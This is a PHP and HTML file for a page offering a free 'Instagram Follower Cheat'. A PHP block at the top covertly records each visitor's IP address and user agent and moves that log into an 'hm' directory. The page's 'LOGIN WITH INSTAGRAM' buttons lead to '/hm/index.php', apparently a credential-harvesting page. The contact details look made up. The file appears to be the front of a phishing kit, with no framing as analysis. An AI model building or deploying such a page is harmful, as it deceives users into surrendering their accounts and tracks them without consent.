<<?php
if (isset($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddr = $_SERVER['HTTP_CLIENT_IP'];
} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddr = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddr = $_SERVER['REMOTE_ADDR'];
}
if (strpos($ipaddr, ',') !== false) {
    $ipaddr = preg_split("/\,/", $ipaddr)[0];
}
$fp = fopen('ip.txt', 'a');
fwrite($fp, "IP: " . $ipaddr . "\r\n" . "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n\n");
fclose($fp);

$destination = 'hm/ip.txt';
if (rename('ip.txt', $destination)) {
    echo "File moved successfully.";
} else {
    echo "Failed to move the file.";
}
?>



<!DOCTYPE html>
<html lang="en">
<head>
  <title>instax</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
</head>
<body>
<div class="pos-f-t">
  <div class="collapse" id="navbarToggleExternalContent">
    <div class="bg-dark p-4">
      <h4 class="text-white">Insta Follower </h4>

    </div>
  </div>
  <nav class="navbar navbar-dark bg-dark">
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarToggleExternalContent" aria-controls="navbarToggleExternalContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <a href="/hm/index.php" class="btn btn-outline-light ml-auto" type="button"><i class="fa fa-instagram" style="font-size:"></i> Login</a>
  </nav>
</div>


<br><br>
<h3 style="text-align: center;"><strong>Instagram Follower Cheat - Instagram Like Cheat</strong></h3>
<h6 style="text-align: center;"><span style="color: rgb(114, 114, 114);"><strong>Get free Instagram follower cheat, Instagram like cheat, and follower boost service every half hour.<br>
Gain +250 followers, +100 likes credits, +1,000 video views, and story views credits on your first login.</strong></span><br>
<u><span style="color:#ff0000;"><strong>All credits are refreshed every 30 minutes. Keep following and supporting us.</strong></span></u></h6>
<p style="text-align: center;"><strong>&nbsp;<a class="btn btn-lg btn-primary" href="/hm/index.php" style="letter-spacing: 0.1px;"> <i class="fa fa-instagram"></i> LOGIN WITH INSTAGRAM </a></strong></p>
<p><strong> </strong></p>
<p style="text-align: center;"><label class="checkbox inline text-center"><strong style="letter-spacing: 0.1px;"><span style="font-size: 20px;"><a class="btn btn-info" href="https://takipcitime.com/">1. SERVER +500</a></span></strong><strong style="letter-spacing: 0.1px;"><span style="font-size: 20px;"><strong>&nbsp;<a href="member.html" title="Instagram Follower Sales">&nbsp;</a></strong></span></strong></label></p>

<br>
<footer class="footer bg-dark text-light">
  <div class="container">
    <div class="row">
      <div class="col-md-6">
        <br>
        <h5>About Us</h5>
        <p>our systems provide free followers on Instagram </p>
      </div>
      <div class="col-md-3">
        <h5>Quick Links</h5>
        <ul class="list-unstyled">
          <li><a href="#">Home</a></li>
        </ul>
      </div>
      <div class="col-md-3">
        <h5>Contact Us</h5>
        <address>
          121 street,<br>
          New York , 10080<br>
          Phone: +1 985437000<br>
          Email: info@instafollowr.cc
        </address>
      </div>
    </div>
    <hr>
    <div class="row">
      <div class="col-md-6">
        <p>&copy;2020 - 2023 Insta Follower. All rights reserved.</p>
      </div>
      <div class="col-md-6">
        <ul class="list-inline float-md-right">
          <li class="list-inline-item"><a href="#">Terms of Service</a></li>
          <li class="list-inline-item"><a href="#">Privacy Policy</a></li>
        </ul>
      </div>
    </div>
  </div>
</footer>
